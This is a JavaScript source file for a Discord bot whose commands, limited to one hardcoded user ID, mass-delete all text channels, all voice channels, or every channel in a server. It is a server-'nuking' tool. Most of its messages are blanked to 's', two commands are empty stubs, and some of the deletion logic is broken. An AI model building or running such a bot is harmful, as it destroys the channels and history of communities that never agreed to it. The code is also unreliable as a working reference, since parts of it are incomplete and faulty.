//install discord.js, chalk, and dotenv via npm for this to work
const Discord = require('discord.js');
const chalk = require('chalk');
const client = new Discord.Client();
const prefix = '!';
const fs = require('fs');

client.on('message', message => {
    if(!message.content.startsWith(prefix) || message.author.bot) return;
    const args = message.content.slice(prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();
    if(command === 'help'){
        try{
            const helpEmbed = new Discord.MessageEmbed()
            .setColor('#1c5fa6')
            .setTitle('**:s**')
            .addFields(
                {name: 'tchannels', value: 's', inline: false},
                {name: 'vchannels', value: 's', inline: false},
                {name: 'achannels', value: 's', inline: false},
                {name: 'akchannels', value: 's', inline: false},
                {name: 'abchannels', value: 's', inline: false},
            )
            .setTimestamp();
            message.channel.send(helpEmbed); 
        } catch{
            console.log(chalk.bold.bgRed(`s`));
        }
    } else if (command == 'tchannels'){
        if(message.author.id === "757278263633510410") {
            //1
            try{
                message.guild.channels.cache.filter((c) => c.type === "text").forEach(channel => channel.delete());
                console.log(chalk.bgGreen.black('s'));
                //2
                return
                //3
            } catch (error) {
                const tchannelsErrEmbed = new Discord.MessageEmbed()
                .setColor('#a61c1c')
                .setTitle('s')
                .setDescription(error)
                message.channel.send(tchannelsErrEmbed);
                console.log(chalk.bold.bgRed(`s`));
                console.log(chalk.bold.bgRed('s: ' + error));
            }
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`:x:  s. @${message.author.username}`)
            message.channel.send(noIdEmbed);
        }
    } else if (command == 'vchannels') {
        if(message.author.id === "757278263633510410") {
            const vchannelsEmbed = new Discord.MessageEmbed()
            .setColor('#1c5fa6')
            .setTitle('s') 
            message.channel.send(vchannelsEmbed);
            try{
                message.guild.channels.cache.forEach((channel) => {
                    message.guild.channels.cache.filter((c) => c.type === "voice").forEach(channel => channel.delete());
                    console.log(chalk.bgGreen.black('s'));
                        const vchannelsDelEmbed = new Discord.MessageEmbed()
                        .setColor('#3fa61c')
                        .setTitle('s') 
                        message.channel.send(vchannelsDelEmbed);
                    return
                    //4
                });
            } catch (error) {
                const vchannelsErrEmbed = new Discord.MessageEmbed()
                .setColor('#a61c1c')
                .setTitle('s')
                .setDescription(error)
                message.channel.send(vchannelsErrEmbed);
                console.log(chalk.bold.bgRed(`s`));
            }
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`s @${message.author.username}`)
            message.channel.send(noIdEmbed);
        } 
    } else if (command == 'achannels') {
        if(message.author.id === "757278263633510410") {
            try{
                message.guild.channels.cache.forEach((channel  => channel.delete()));
                if (!message.guild.channels.filter((c) => c.type === "text" || c.type === "voice").size === 0){
                    console.log(chalk.bgGreen('s.'))
                    return;
                }
            } catch (error){
                console.log(chalk.bold.bgRed(`s.`));
            }
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`:x:  s. @${message.author.username}`)
            message.channel.send(noIdEmbed);
        }
    } else if (command == 'akchannels') {
        if(message.author.id === "757278263633510410") {
            // code here
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`:s @${message.author.username}`)
            message.channel.send(noIdEmbed);
        }
    } else if (command == 'abchannels') {
        if(message.author.id === "757278263633510410") {
            // code here
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`d @${message.author.username}`)
            message.channel.send(noIdEmbed);
        }
    }
});
client.login('token');
